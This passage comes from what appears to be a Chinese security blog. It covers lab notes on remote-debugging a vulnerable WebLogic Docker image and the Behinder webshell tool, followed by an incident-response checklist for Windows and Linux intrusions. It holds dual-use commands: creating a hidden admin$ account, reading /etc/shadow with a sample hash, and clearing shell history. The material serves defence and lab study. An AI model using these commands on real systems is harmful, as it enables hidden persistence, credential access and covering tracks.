address=&lt;mysharedmem&gt;</span><br></pre></td></tr></table></figure></li><li><p>调试者基于共享内存方式启动被调试者:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-agentlib:jdwp=transport=dt_shmem,server=y,onuncaught=y,launch=d:\bin\debugstub.exe</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>被调试者基于共享内存的监听启动后，共享内存地址将会打印到控制台上。调试者配置时需要配置这个共享内存的地址</p></blockquote><p><img src="/../image/image-20240817151422886.png" alt="image-20240817151422886"></p><p>单击 IntelliJ IDEA 右上角的 Debug 按钮，即可发现程序在断点处暂停，然后就可以进行逐步的调试了  </p><p><img src="/../image/image-20240817152419041.png" alt="image-20240817152419041"></p><h2 id="对-Weblogic-进行远程调试"><a href="#对-Weblogic-进行远程调试" class="headerlink" title="对 Weblogic 进行远程调试"></a>对 Weblogic 进行远程调试</h2><p>这次试试在不同虚拟机里测试一下，进入&#x2F;weblogic&#x2F;CVE-2017-10271 文件夹，修改其中的 docker-compose.yml 文件，将 8453 端口打开  </p><p><img src="/../image/image-20240817152713534.png" alt="image-20240817152713534"></p><p>使用 docker-compose 命令 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure><p>编译镜像并启动容器。容器成功启动，开启 8453 端口并且映射到本机 ，可以用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>查看是否启动成功 </p><p><img src="/../image/image-20240817154100250.png" alt="image-20240817154100250"></p><p>使用(a6就是容器id前2位缩写)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it a6 /bin/bash</span><br></pre></td></tr></table></figure><p> 命令进入容器，使用 vi 修改文件&#x2F;root&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;bin&#x2F;setDomainEnv.sh。 在图 2-41 所示代码段处添加如下两行代码。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ebugFlag=&quot;true&quot;</span><br><span class="line">export debugFlag</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240817155453094.png" alt="image-20240817155453094"></p><p>使用 docker restart 命令重启容器，再进入容器，将&#x2F;root&#x2F;Oracle&#x2F;Middleware 文件夹下的 modules 文件夹和 wlserver_10.3 文件夹使用 zip 命令压缩成 zip 压缩包。容器中是一个简易的 Linux 系统， 需要执行 apt-get install zip 来安装 zip 压缩功能。Windows命令行对路径长度有限制，如果直接使用 docker 的 cp 指令，就会在复制一些长文件  </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it a6 /bin/bash</span><br><span class="line">ls</span><br><span class="line">apt-get install zip</span><br><span class="line">zip -r modules</span><br><span class="line">zip -r wlserver_10.3.zip</span><br><span class="line">ls</span><br><span class="line">docker </span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240817160250090.png" alt="image-20240817160250090"></p><p>将该文件移动至一个项目文件中，并使用 IDEA 打开，如图 2-43 所示，选中w1server_10.3&#x2F;server&#x2F;lib 文件和 modules 文件并右键单击，选择“Add as Library…”添加依赖文件。如图 2-44 所示，单击 IDEA 右上角的“Add Configurations”按钮，在弹出的选项框中单击左上角的“+”进行“Add New Configurations”操作。然后在下拉框中找到 Remote 选项并单击，进入图 2-45 所示的配置页面，填写端口号为 8453，注意，需要与第一步在 docker-compose.yml 文件中的填写内容保持一致。填写完毕，单击“Apply”按钮应用配置，再单击“OK”按钮关闭配置页面即可。  （还是要移动下依赖文件，保证远调配置一致），这里我们看下用python起个服务器下载，到win10</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240817161307116.png" alt="image-20240817161307116"></p><p>解压的时候文件名太长可以下个7zip之类的阶压缩软件，解压完后直接右键在idea打开</p><p><img src="/../image/image-20240817162535174.png" alt="image-20240817162535174"></p><p>添加依赖时，如果不能加，可能时项目结构没配置，jdk索引没建立好，等一会就行，添加好后，配置远程调试</p><p><img src="/../image/image-20240817162942602.png" alt="image-20240817162942602"></p><p>因为是在另一台虚拟机，host得改一下然后端口改成刚刚配置yml文件里得8453</p><p>在wlserver_10.3&#x2F;server&#x2F;lib&#x2F;weblogic.jar!&#x2F;weblogic&#x2F;wsee&#x2F;jaxws&#x2F;WLSServletAdapter.class 的 hadle 方法处设置断点， 接着单击右上角的 Debug 按钮（绿色小虫子图标）运行 Debug 模式。然后使用浏览器访问 <a href="http://192.168.174.137:7001/wls-wsat/CoordinatorPortType%EF%BC%8C%E5%90%8C%E6%97%B6%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E5%9C%A8%E6%96%AD%E7%82%B9%E5%A4%84%E5%81%9C">http://192.168.174.137:7001/wls-wsat/CoordinatorPortType，同时查看程序在断点处停</a>  </p><p><img src="/../image/image-20240817163455646.png" alt="image-20240817163455646"></p><p>这里好像是因为docker镜像起得debug绑定的是本地ip，所以我们去连是连不到的，里面是ping的通外面，但我们在win10是ping不到容器里面的，但反弹shell有时候又弹的回来，我也搞不懂为什么。所以我这里换一个试试，在kali里启动冰蝎，然后用上面的指令</p><p><img src="/../image/image-20240817231119504.png" alt="image-20240817231119504"></p><p>在kali中执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5005 Behinder.jar</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240817233104480.png" alt="image-20240817233104480"></p><p>不能在只有behinder.jar的环境下启动，要在环境全的时候执行，也就是正常启动冰蝎的目录</p><p><img src="/../image/image-20240817233416946.png" alt="image-20240817233416946"></p><p>可以试着调试几步</p><p><img src="/../image/image-20240817233529597.png" alt="image-20240817233529597"></p><p>可以看到这边已经弹窗了</p><p><img src="/../image/image-20240817233548611.png" alt="image-20240817233548611"></p><p>然后中间找了篇文章<a href="https://blog.csdn.net/allinallp/article/details/117747427%EF%BC%8C%E7%A1%AE%E5%AE%9E%E8%A6%81%E5%86%8D%E9%85%8D%E7%BD%AE%E4%B8%80%E4%B8%8BJPDA%EF%BC%8C%E5%85%88%E7%94%A8weblogic%E7%85%A7%E7%9D%80%E6%A0%B7%E5%AD%90%E8%AF%95%E8%AF%95%EF%BC%8C%E5%85%88%E4%BF%AE%E6%94%B9%E4%B8%8Byml%E6%96%87%E4%BB%B6%EF%BC%88%E4%B8%AD%E9%97%B4%E8%B0%83%E7%9D%80%E8%B0%83%E7%9D%80%E8%93%9D%E5%B1%8F%E9%87%8D%E5%90%AF%E4%BA%86%EF%BC%89">https://blog.csdn.net/allinallp/article/details/117747427，确实要再配置一下JPDA，先用weblogic照着样子试试，先修改下yml文件（中间调着调着蓝屏重启了）</a></p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">weblogic:</span></span><br><span class="line">   <span class="attr">image:</span> <span class="string">vulhub/weblogic:10.3.6.0-2017</span></span><br><span class="line">   <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;7001:7001&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;8453:8453&quot;</span></span><br><span class="line">   <span class="attr">environment:</span></span><br><span class="line">    <span class="attr">TZ:</span> <span class="string">Asia/Shanghai</span></span><br><span class="line">    <span class="attr">JPDA_ADDRESS:</span> <span class="number">8453</span></span><br><span class="line">    <span class="attr">JPDA_TRANSPORT:</span> <span class="string">dt_socket</span></span><br><span class="line">   <span class="attr">command:</span> [<span class="string">&quot;startWebLogic.sh&quot;</span>,<span class="string">&quot;jpda&quot;</span>, <span class="string">&quot;run&quot;</span>]</span><br></pre></td></tr></table></figure><p><strong>注意好缩进</strong>，改好了再docker-compose up -d，再回到win10里试试。如果不行，就按他的tomcat试试，不行，这个配置脚本不一样，还是要根据具体脚本改，在里面看不太好看，cp出来把</p><p><img src="/../image/image-20240818003143055.png" alt="image-20240818003143055"></p><p>改下这个位置试试，然后再加上ip，但按我的理解来看，这只是把debug绑在了容器里的端口，无法让别的网段的访问，两台机子都不可达，感觉怎么改都没用，但服务又是可以访问的，不懂为什么，应该就是要docker network改一下，但不会。。因该就是怎么改都没用，不可达docker的网络，得在ping的通情况下改。</p><p>创建网络</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker network create \</span><br><span class="line"> --driver bridge \</span><br><span class="line"> --subnet=192.168.174.0/24 \</span><br><span class="line"> --gateway=192.168.174.2 \</span><br><span class="line"> --ip-range=192.168.174.100/29 \</span><br><span class="line"> my_network</span><br></pre></td></tr></table></figure><p>连接网络</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker network connect my_network container_name_or_id</span><br></pre></td></tr></table></figure><p>无法访问目标主机，算了先跳过把</p>]]></content>
      
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应练习</title>
      <link href="/2024/08/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%BB%83%E4%B9%A0/"/>
      <url>/2024/08/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><p>本文参考自bypass007师傅的博客<a href="https://bypass007.github.io/Emergency-Response-Notes/?q=%E6%9D%A5%E5%86%99%EF%BC%8C%E4%B8%BB%E8%A6%81%E6%98%AF%E5%8A%A0%E6%B7%B1%E5%8D%B0%E8%B1%A1%EF%BC%8C%E4%BB%A5%E5%8F%8A%E5%B1%95%E5%BC%80%E5%85%B7%E4%BD%93%E6%96%B9%E6%B3%95">https://bypass007.github.io/Emergency-Response-Notes/?q=来写，主要是加深印象，以及展开具体方法</a></p><p>常见的应急响应事件分类：</p><p>web入侵：网页挂马、主页篡改、Webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS攻击、DNS劫持、ARP欺骗</p><h2 id="1、Window入侵排查"><a href="#1、Window入侵排查" class="headerlink" title="1、Window入侵排查"></a>1、Window入侵排查</h2><h3 id="1-1-检查系统账号安全"><a href="#1-1-检查系统账号安全" class="headerlink" title="1.1. 检查系统账号安全"></a>1.1. 检查系统账号安全</h3><p>查看服务器是否有弱口令、远程管理端口是否对公网开放</p><h3 id="1-2-查看服务器是否存在可以账号、新增账号"><a href="#1-2-查看服务器是否存在可以账号、新增账号" class="headerlink" title="1.2. 查看服务器是否存在可以账号、新增账号"></a>1.2. 查看服务器是否存在可以账号、新增账号</h3><p>1.本地用户和组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lusrmgr.msc</span><br></pre></td></tr></table></figure><p>这个命令可以用来查看本地用户和组，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p>有些隐藏用户用上面的命令可能查不出来，需要去注册表查，比如现在添加一个admin$用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user admin$ /add</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240704211456836-1723802059793-1.png" alt="image-20240704211456836"></p><p>2.但在注册表中会有该账户，用第一个命令也查的出来，但如果是在注册表注册的用户是查不出来的，还是提一下注册表的位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看注册表（最准）HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240704212730368-1723802059793-2.png" alt="image-20240704212730368"></p><p>3.还有一种用D盾的方法，在工具的格隆检测里</p><p><img src="/../image/image-20240704212810841-1723802059793-3.png" alt="image-20240704212810841"></p><p>4.结合日志，查看管理员登录时间、用户名是否存在异常</p><ul><li><p>检查方法：</p><p>a、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>b、导出Windows日志–安全，利用Log Parser进行分析。</p></li></ul><p>上面是原文提的方法，我这里把他具体操作一下，一安全日志为例</p><p><em>参考链接：</em></p><p><a href="https://blog.csdn.net/YouthBelief/article/details/121408442">https://blog.csdn.net/YouthBelief/article/details/121408442</a></p><p><a href="https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/">https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/</a></p><p>1.查询登录成功的事件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o:DATAGRID  &quot;SELECT *  FROM Security.evtx where EventID=4624&quot;</span><br></pre></td></tr></table></figure><p>参数解析：</p><ul><li>-i：输入文件的格式</li><li>-o：输出文件的格式 </li><li>“SQL语句”</li></ul><p><img src="/../image/image-20240705231602917-1723802059794-5.png" alt="image-20240705231602917"></p><h3 id="1-3-检查异常端口、进程"><a href="#1-3-检查异常端口、进程" class="headerlink" title="1.3 检查异常端口、进程"></a>1.3 检查异常端口、进程</h3><p>1、检查端口连接情况，是否有远程连接、可疑连接。</p><ul><li><p>检查方法：</p><p>a、netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED</p><p>b、根据netstat 定位出的pid，再通过tasklist命令进行进程定位 tasklist | findstr “PID”</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><ul><li>-a:显示所有连接中的接口信息</li><li>-n:直接使用ip地址，而不是域名</li><li>-o 显示计时器数据信息</li></ul><p><img src="/../image/image-20240705232511517-1723802059794-4.png" alt="image-20240705232511517"></p><p>可以看到打印出来的信息有协议，本地地址，外部地址，状态和pid，首先我们需要关注的就是ESTABLISHED的信息，然后看有没有访问除80和443端口的特别端口，如果有可以将相应的外部地址放到微步等威胁情报平台查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano | findstr &quot;ESTABLISHED&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240705232714803-1723802059794-6.png" alt="image-20240705232714803"></p><p>就比如这条，5228端口的，我们可以放到微步里查一查</p><p><img src="/../image/image-20240705232800511-1723802059794-7.png" alt="image-20240705232800511"></p><p>可以看到是谷歌的ip，还可以根据pid去定位进程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist | findstr 14644</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240705232922465-1723802059794-8.png" alt="image-20240705232922465"></p><p>可以看到是谷歌的进程，和微步里查的有关联，下面推荐一些相关</p><h4 id="情报社区"><a href="#情报社区" class="headerlink" title="情报社区"></a>情报社区</h4><p>深信服威胁情报中心：<a href="https://sec.sangfor.com.cn/security-vulnerability">https://sec.sangfor.com.cn/security-vulnerability</a></p><p>微步在线：<a href="https://x.threatbook.com/">https://x.threatbook.com/</a></p><p>venuseye：<a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a></p><p>安恒情报中心：<a href="https://ti.dbappsecurity.com.cn/">https://ti.dbappsecurity.com.cn/</a></p><p>360：<a href="https://ti.360.cn/">https://ti.360.cn/</a></p><p>绿盟：<a href="https://ti.nsfocus.com/">https://ti.nsfocus.com/</a></p><p>virustotal：<a href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a></p><p>2、进程</p><ul><li><p>检查方法：</p><p>a、开始–运行–输入msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等。</p><p><img src="/../image/image-20240705234431812-1723802059794-9.png" alt="image-20240705234431812"></p><p>b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p><p><img src="/../image/image-20240707131621121-1723802059794-10.png" alt="image-20240707131621121"></p><p>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</p><p><img src="/../image/image-20240707131717416-1723802059794-11.png" alt="image-20240707131717416"></p><p>d、查看可疑的进程及其子进程。可以通过观察以下内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">没有签名验证信息的进程</span><br><span class="line">没有描述信息的进程</span><br><span class="line">进程的属主</span><br><span class="line">进程的路径是否合法</span><br><span class="line">CPU或内存资源占用长时间过高的进程</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../image/image-20240707131754114-1723802059794-12.png" alt="image-20240707131754114"></p><p>双击process monitor的进程可以得到上面的信息</p><p>3、小技巧：</p><p> a、查看端口对应的PID： netstat -ano | findstr “port”</p><p><img src="/../image/image-20240707131924214-1723802059794-14.png" alt="image-20240707131924214"></p><p> b、查看进程对应的PID：任务管理器–查看–选择列–PID 或者 tasklist | findstr “PID”</p><p><img src="/../image/image-20240707131951164-1723802059794-13.png" alt="image-20240707131951164"></p><p> c、查看进程对应的程序位置：</p><p> 任务管理器–选择对应进程–右键打开文件位置</p><p> 运行输入 wmic，cmd界面 输入 process（这个好像要修复一下，我的环境有点问题）</p><p> d、tasklist &#x2F;svc 进程–PID–服务</p><p><a href="https://blog.csdn.net/carefree2005/article/details/117473176">https://blog.csdn.net/carefree2005/article/details/117473176</a></p><p>列出svchost进程所运行的服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /svc /fi &quot;imagename eq svchost.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240707132707824-1723802059794-15.png" alt="image-20240707132707824"></p><p>命令查看wuhsh用户正在运行的进程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /fi &quot;USERNAME ne yxz&quot; /fi &quot;status eq running&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240707132525583-1723802059794-16.png" alt="image-20240707132525583"></p><p> e、查看Windows服务所对应的端口： %system%&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;services（一般%system%就是C:\Windows）</p><p><img src="/../image/image-20240707132957488-1723802059794-17.png" alt="image-20240707132957488"></p><h3 id="1-4-检查启动项、计划任务、服务"><a href="#1-4-检查启动项、计划任务、服务" class="headerlink" title="1.4 检查启动项、计划任务、服务"></a>1.4 检查启动项、计划任务、服务</h3><p>1、检查服务器是否有异常的启动项。</p><ul><li><p>检查方法：</p><p>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。</p><p>我的理解是这个启动</p><p><img src="/../image/image-20240707133251594-1723802059794-18.png" alt="image-20240707133251594"></p><p> b、单击开始菜单 &gt;【运行】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。</p><p><img src="/../image/image-20240707133359797-1723802059794-19.png" alt="image-20240707133359797"></p><p> c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项： </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce </span><br></pre></td></tr></table></figure><p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p><p><img src="/../image/image-20240707133550487-1723802059794-20.png" alt="image-20240707133550487"></p><p>d、利用安全软件查看启动项、开机时间管理等。</p><p>这里用之前的D盾也是可以的</p><p><img src="/../image/image-20240707133620399-1723802059794-21.png" alt="image-20240707133620399"></p><p>e、组策略，运行gpedit.msc</p><p>查看里面有没有未知的启动脚本</p></li></ul><p><img src="/../image/image-20240707133730057-1723802059794-22.png" alt="image-20240707133730057"></p><p>2、检查计划任务</p><ul><li><p>检查方法：</p><p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt; 管理 &gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p><p><img src="/../image/image-20240707133909916-1723802059794-23.png" alt="image-20240707133909916"></p><p>b、单击【开始】&gt;【运行】；输入 cmd，然后输入at，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。我这里提示是at命令不可用，要用schtasks,这个命令也可以用来创建windows的定时任务</p><p><a href="https://blog.csdn.net/yj222333/article/details/109194525">https://blog.csdn.net/yj222333/article/details/109194525</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240707133943125-1723802059794-24.png" alt="image-20240707133943125"></p></li></ul><p>3、服务自启动</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入services.msc，注意服务状态和启动类型，检查是否有异常服务。</li></ul><p><img src="/../image/image-20240707135618020-1723802059794-25.png" alt="image-20240707135618020"></p><p>启动类型主要是看是否是自启动，对自启动的服务我们需要进一步的检查，看下具体内容，对于未知的服务可以搜索下来源，看下是什么应用提供的。</p><h3 id="1-5-检查系统相关信息"><a href="#1-5-检查系统相关信息" class="headerlink" title="1.5 检查系统相关信息"></a>1.5 检查系统相关信息</h3><p>1、查看系统版本以及补丁信息</p><ul><li>检查方法：启动cmd，输入systeminfo，查看系统信息</li></ul><p>多注意主机名，操作系统类型，版本，对应补丁以及网卡信息等</p><p>2、查找可疑目录及文件</p><ul><li><p>检查方法：</p><p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p><p> Window 2003 C:\Documents and Settings</p><p> Window 2008R2 C:\Users\</p><p>就是看有没有对应用户的用户目录，我去看了下win2003的确实是这个文件</p><p>b、单击【开始】&gt;【运行】，输入%UserProfile%\Recent，分析最近打开分析可疑文件。</p><p><img src="/../image/image-20240707141006094-1723802059794-26.png" alt="image-20240707141006094"></p><p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p><p>d、回收站、浏览器下载目录、浏览器历史记录</p><p>e、修改时间在创建时间之前的为可疑文件</p></li></ul><p>3、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p> a、利用 Registry Workshop 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。</p><p><img src="/../image/image-20240707143518006-1723802059794-27.png" alt="image-20240707143518006"></p><p> b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</p><h3 id="1-6-自动化查杀"><a href="#1-6-自动化查杀" class="headerlink" title="1.6 自动化查杀"></a>1.6 自动化查杀</h3><ul><li>病毒查杀<ul><li>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li></ul></li><li>webshell查杀<ul><li>检查方法：选择具体站点路径进行webshell查杀，建议使用两款webshell查杀工具同时查杀，可相互补充规则库的不足。</li></ul></li></ul><h3 id="1-7-日志分析"><a href="#1-7-日志分析" class="headerlink" title="1.7 日志分析"></a>1.7 日志分析</h3><p>系统日志</p><ul><li><p>分析方法：</p><p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>b、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>C、导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。</p></li></ul><p>WEB访问日志</p><ul><li><p>分析方法：</p><p>a、找到中间件的web日志，打包到本地方便进行分析。</p><p>b、推荐工具：Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p><p> Linux下，使用Shell命令组合查询分析</p></li></ul><h3 id="1-8-防火墙检测"><a href="#1-8-防火墙检测" class="headerlink" title="1.8 防火墙检测"></a>1.8 防火墙检测</h3><p><a href="https://www.couragesteak.com/article/29">https://www.couragesteak.com/article/29</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall show rule name=all dir=in type=dynamic</span><br></pre></td></tr></table></figure><p>输出信息太多可以重定向到txt文件里用文本编辑器进行分析</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall show rule name=all dir=in type=dynamic &gt; 1.txt</span><br></pre></td></tr></table></figure><h2 id="2、Linux入侵排查"><a href="#2、Linux入侵排查" class="headerlink" title="2、Linux入侵排查"></a>2、Linux入侵排查</h2><h3 id="2-1-账号安全"><a href="#2-1-账号安全" class="headerlink" title="2.1 账号安全"></a>2.1 账号安全</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、用户信息文件/etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell</span><br><span class="line">注意：无密码只允许本机登陆，远程不允许登陆</span><br><span class="line"></span><br><span class="line">2、影子文件/etc/shadow</span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">who     查看当前登录用户（tty本地登陆  pts远程登录）</span><br><span class="line">w       查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">uptime  查看登陆多久、多少用户，负载</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240707163219938-1723802059794-28.png" alt="image-20240707163219938"></p><p><strong>入侵排查：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line">2、查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br><span class="line">4、禁用或删除多余及可疑的帐号</span><br><span class="line">    usermod -L user    禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头</span><br><span class="line">    userdel user       删除user用户</span><br><span class="line">    userdel -r user    将删除user用户，并且将/home目录下的user目录一并删除</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240707164049738-1723802059794-30.png" alt="image-20240707164049738"></p><h3 id="2-2-历史命令"><a href="#2-2-历史命令" class="headerlink" title="2.2 历史命令"></a>2.2 历史命令</h3><p><strong>基本使用：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过.bash_history查看帐号执行过的系统命令</span><br><span class="line">1、root的历史命令</span><br><span class="line">histroy</span><br><span class="line">2、打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令</span><br><span class="line"></span><br><span class="line">为历史的命令增加登录的IP地址、执行命令时间等信息：</span><br><span class="line">1）保存1万条命令</span><br><span class="line">sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile</span><br><span class="line">2）在/etc/profile的文件尾部添加如下行数配置信息：</span><br><span class="line">######jiagu history xianshi#########</span><br><span class="line">USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`</span><br><span class="line">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND=&quot;history -a&quot;</span><br><span class="line">######### jiagu history xianshi ##########</span><br><span class="line">3）source /etc/profile让配置生效</span><br><span class="line"></span><br><span class="line">生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</span><br><span class="line"></span><br><span class="line">3、历史操作命令的清除：history -c</span><br><span class="line">但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录。</span><br></pre></td></tr></table></figure><p>这里解释一下代码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">USER_IP=`<span class="built_in">who</span> -u am i 2&gt;/dev/null | awk <span class="string">&#x27;&#123;print $NF&#125;&#x27;</span> | sed -e <span class="string">&#x27;s/[()]//g&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$USER_IP</span>&quot;</span> = <span class="string">&quot;&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">USER_IP=`hostname`</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">export</span> HISTTIMEFORMAT=<span class="string">&quot;%F %T <span class="variable">$USER_IP</span> `whoami` &quot;</span></span><br><span class="line"><span class="built_in">shopt</span> -s histappend</span><br><span class="line"><span class="built_in">export</span> PROMPT_COMMAND=<span class="string">&quot;history -a&quot;</span></span><br></pre></td></tr></table></figure><p>这段代码是一个用于在Linux或Unix系统中显示命令历史记录的脚本。让我解释一下每一部分的含义：</p><ol><li><code>USER_IP=</code>who -u am i 2&gt;&#x2F;dev&#x2F;null | awk ‘{print $NF}’ | sed -e ‘s&#x2F;[()]&#x2F;&#x2F;g’&#96;&#96;: 这一行代码用于获取用户的IP地址。它通过执行<code>who -u am 